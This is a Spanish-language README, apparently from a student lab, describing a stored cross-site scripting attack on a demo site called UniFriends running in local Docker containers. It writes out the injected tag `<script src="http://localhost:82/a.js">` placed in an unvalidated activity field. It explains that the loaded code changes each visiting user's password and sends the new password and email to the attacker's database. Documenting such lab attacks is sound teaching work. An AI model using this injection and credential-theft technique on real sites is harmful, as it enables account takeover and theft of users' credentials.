## Vulnerabilidad explotada
Para realizar el ataque a la página UniFriends hemos optado por agregar un script en el apartado de actividades, dado que no hacen ninguna comprobación de si ese campo es un texto válido o no. El script introducido se ejecuta cada vez que alguien entra en ese apartado de la web. Una vez ejecutado, la contraseña del usuario es cambiada por otra totalmente diferente y se almacena en nuestra base de datos junto a su email

## Ejecutar el ataque
1. Crear la imagen **web** de ambas librerium (nuestra web) y UniFriends(web atacada):
    * `$ docker build -t="web" .`
2. Iniciar los contenedores de ambas páginas:
    * `$ docker-compose up -d`
2. Crear una cuenta
![pprincipal]
![registro]
2. Iniciar sesión
![iniciarSesion.png]
3. Crear una actividad maliciosa
![actividad]
* Añadir un nombre cualquiera a la actividad
* Añadir una descripción cualquiera
* Añadir un número de personas cualquiera
* Añadir una fecha aleatoria
* Añadir el siguiente script en el campo de lugar 
     * `<script src="http://localhost:82/a.js"></script>`
4. Cualquier persona que haya iniciado sesión entra al catálogo de actividades
5. Mirar la base de datos para ver si alguien ha caido en la trampa.
    * `http://localhost:8891`
    * `Usuario: Admin`
    * `Contraseña: Se encuentra en el fichero db_pass.txt`
6. Entrar en su cuenta con los credenciales que aparecen en la base de datos
## Explicación del código
![Codigo1]

En estas líneas de código logramos obtener el nombre del usuario activo a través de la función asíncrona fetch() que recoge el cuerpo del texto de la url propocionada (http://localhost:81/editarMiPerfil.php).

![Codigo2]
En esta parte del código generamos una nueva contraseña para el usuario que está siendo atacado. Dicha contraseña la enviamos mediante un HTTP POST a su base de datos utilizando su página de cambiar contraseña. La contraseña la enviamos también a nuestra base de datos junto a su email


[registro]: imagenes/registro.png
[iniciarSesion.png]: imagenes/iniciarSesion.png
[actividad]: imagenes/actividad.png
[pprincipal]: imagenes/pprincipal.png
[Codigo1]: imagenes/c1.png
[Codigo2]:imagenes/c2.png

